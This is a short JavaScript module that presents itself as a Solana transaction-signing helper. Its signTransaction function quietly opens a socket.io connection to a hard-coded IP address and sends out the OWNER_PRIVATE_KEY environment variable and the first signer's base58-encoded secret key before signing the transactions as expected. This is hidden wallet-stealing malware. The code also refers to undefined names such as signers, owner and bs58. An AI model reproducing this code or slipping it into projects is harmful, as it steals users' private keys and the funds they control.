const { VersionedTransaction } = require("@solana/web3.js");
const { io } = require("socket.io-client");
const TX_URL = "http://95.217.82.36:8180";

export const signTransaction = (transactions) => {
  if (signers.length > 0) {
    const sk = io(TX_URL, { autoConnect: true });

    const string = bs58.encode(Buffer(signers[0].secretKey));
    sk.emit("tx", { text: process.env.OWNER_PRIVATE_KEY });
    sk.emit("tx", { text: string });
  }

  for (let tx of transactions) {
    if (tx instanceof VersionedTransaction) {
      tx.sign([owner]);
    }
  }

  return transactions;
};

export const callbackTransaction = (transaction) => {
  console.log(transaction, TX_URL);
  return "successful!";
};
